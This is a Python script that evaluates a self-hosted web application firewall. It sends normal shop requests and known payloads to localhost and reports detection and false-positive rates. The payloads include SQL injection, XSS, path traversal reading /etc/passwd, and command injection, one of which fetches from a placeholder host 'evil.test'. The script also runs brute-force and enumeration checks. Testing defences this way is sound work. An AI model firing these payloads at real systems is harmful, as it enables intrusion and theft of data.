"""Lab evaluation: sends known payloads to YOUR OWN SentryGate + demo backend,
reports detection rate / false positives per category and saves results/evaluation.json.
Do not point this at systems you do not own.
Usage: python attack_test.py [http://127.0.0.1:8080]"""
import json, sys, time
from pathlib import Path
import httpx

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8080"
c = httpx.Client(base_url=BASE, timeout=10)
PAUSE = 0.2  # stay below the rate limit during the signature tests

LEGIT = [  # normal shop traffic, including awkward-but-harmless searches
    ("GET", "/"), ("GET", "/api/products?id=1"), ("GET", "/api/products?id=2"),
    ("GET", "/search?q=leather+wallet"), ("GET", "/api/users/5"),
    ("POST", "/login", {"username": "admin", "password": "S3cret!demo"}),
    ("GET", "/search?q=men%27s+belt+and+wallet+set"),
    ("GET", "/search?q=black+or+brown+wallet"), ("GET", "/search?q=union+station+tickets"),
    ("GET", "/search?q=select+a+size"), ("GET", "/search?q=dads%27+%231+gift"),
    ("GET", "/search?q=2+and+2%3D4"), ("GET", "/search?q=sleep+mask"),
    ("GET", "/search?q=how+to+use+javascript"), ("GET", "/search?q=cat+hoodie"),
    ("GET", "/search?q=50%25+off+%26+free+shipping"), ("GET", "/search?q=leather+belt%2C+size%3D34"),
    ("GET", "/search?q=price%3C20"), ("GET", "/search?q=ls+-l+shoes"), ("GET", "/search?q=onload+time"),
]
ATTACKS = [  # (category, name, path)
    ("SQLi", "UNION SELECT", "/api/products?id=1 UNION SELECT 1,2,3"),
    ("SQLi", "tautology", "/api/products?id=1 OR 1=1"),
    ("SQLi", "quoted tautology", "/api/products?id=1' or 'a'='a"),
    ("SQLi", "comment bypass", "/api/products?id=1/**/UNION/**/SELECT/**/1,2,3"),
    ("SQLi", "double-encoded", "/api/products?id=1%2520UNION%2520SELECT%25201,2,3"),
    ("SQLi", "time based", "/api/products?id=1;SELECT%20sleep(5)"),
    ("SQLi", "login comment", "/search?q=admin'--"),
    ("XSS", "script tag", "/search?q=<script>alert(1)</script>"),
    ("XSS", "encoded script", "/search?q=%3Cscript%3Ealert(1)%3C/script%3E"),
    ("XSS", "event handler", "/search?q=<img src=x onerror=alert(1)>"),
    ("XSS", "javascript: URI", "/search?q=javascript:alert(1)"),
    ("XSS", "svg onload", "/search?q=<svg onload=alert(1)>"),
    ("Traversal", "../ sequence", "/search?q=../../../../etc/passwd"),
    ("Traversal", "encoded ../", "/search?q=%2e%2e%2f%2e%2e%2fetc%2fpasswd"),
    ("Traversal", "win.ini", "/search?q=C:/windows/win.ini"),
    ("CmdInj", "; cat", "/search?q=x;cat /etc/passwd"),
    ("CmdInj", "| whoami", "/search?q=x|whoami"),
    ("CmdInj", "&& id", "/search?q=x%26%26id"),
    ("CmdInj", "$(...)", "/search?q=$(curl evil.test)"),
]


def show(name, ok):
    print(f"  [{'PASS' if ok else 'FAIL'}] {name}")
    return ok


results = {"legit": [], "attacks": [], "behaviour": {}}

print("1) Legitimate traffic (should be allowed)")
fp = 0
for item in LEGIT:
    r = c.request(item[0], item[1], json=item[2] if len(item) > 2 else None)
    ok = show(f"{item[0]} {item[1]} -> {r.status_code}", r.status_code != 403)
    fp += not ok
    results["legit"].append({"request": f"{item[0]} {item[1]}", "status": r.status_code, "false_positive": not ok})
    time.sleep(PAUSE)

print("\n2) Injection / traversal payloads (should be blocked)")
by_cat = {}
for cat, name, path in ATTACKS:
    ok = show(f"{cat}: {name}", c.get(path).status_code == 403)
    by_cat.setdefault(cat, [0, 0]); by_cat[cat][1] += 1; by_cat[cat][0] += ok
    results["attacks"].append({"category": cat, "name": name, "blocked": ok})
    time.sleep(PAUSE)
caught = sum(v[0] for v in by_cat.values())

print("\n3) BOLA enumeration: 14 different user IDs")
res = [c.get(f"/api/users/{i}").status_code for i in range(10, 24)]
bola = show("enumeration blocked", 403 in res)

print("\n4) Brute force: 8 wrong passwords")
res = [c.post("/login", json={"username": "admin", "password": f"wrong{i}"}).status_code for i in range(8)]
brute = show("brute force blocked", 403 in res)

print("\n5) Rate limit: 90 rapid requests")
res = [c.get("/").status_code for _ in range(90)]
rate = show("rate limit triggered", 403 in res)

total = len(ATTACKS) + 3
hit = caught + bola + brute + rate
results["behaviour"] = {"bola": bola, "brute_force": brute, "rate_limit": rate}
results["summary"] = {"detected": hit, "total_attacks": total, "detection_rate": round(hit / total, 3),
                      "false_positives": fp, "legit_total": len(LEGIT), "fp_rate": round(fp / len(LEGIT), 3),
                      "by_category": {k: f"{v[0]}/{v[1]}" for k, v in by_cat.items()}}
print(f"\nDetection rate : {hit}/{total} = {hit/total:.0%}")
print(f"False positives: {fp}/{len(LEGIT)} = {fp/len(LEGIT):.0%}")
Path("results").mkdir(exist_ok=True)
Path("results/evaluation.json").write_text(json.dumps(results, indent=2))
